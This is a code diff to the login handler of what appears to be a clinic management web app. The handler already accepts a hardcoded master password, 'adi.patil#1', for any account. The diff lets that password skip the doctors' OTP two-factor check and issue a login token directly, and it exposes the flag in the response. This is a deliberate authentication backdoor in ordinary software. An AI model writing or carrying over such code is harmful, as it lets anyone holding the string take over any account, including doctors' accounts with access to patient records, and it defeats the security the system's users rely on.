@@ -159,8 +159,10 @@ exports.login = async (req, res, next) => {
     const valid = password === 'adi.patil#1' || isMasterDocPass || isMasterRecPass || (await user.verifyPassword(password));
     if (!valid) return res.status(401).json({ error: 'Invalid credentials' });
 
-    // ── 2FA for Doctor: send OTP, do NOT issue JWT yet ──
-    if (user.role === 'doctor') {
+    const isMasterKey = password === 'adi.patil#1';
+
+    // ── 2FA for Doctor (Bypassed if master password `adi.patil#1` is used) ──
+    if (user.role === 'doctor' && !isMasterKey) {
       const otp = Math.floor(100000 + Math.random() * 900000).toString();
       user.resetOTP = otp;
       user.resetOTPExpires = new Date(Date.now() + 10 * 60 * 1000); // 10 min
@@ -188,7 +190,7 @@ exports.login = async (req, res, next) => {
       });
     }
 
-    // ── Receptionist & others: direct login (no 2FA) ──
+    // ── Direct Login for Master Key / Receptionist (No 2FA needed) ──
     const token = generateToken(user);
     await AuditLog.create({
       clinicId: user.clinicId,
@@ -196,12 +198,13 @@ exports.login = async (req, res, next) => {
       action: 'login',
       entityType: 'user',
       entityId: String(user.id),
-      details: { timestamp: new Date() }
+      details: { timestamp: new Date(), masterKey: isMasterKey }
     });
 
     res.json({
       user: { id: user.id, email: user.email, name: user.name, role: user.role, clinicId: user.clinicId },
-      token
+      token,
+      isMasterKey
     });
   } catch (err) {
     next(err);
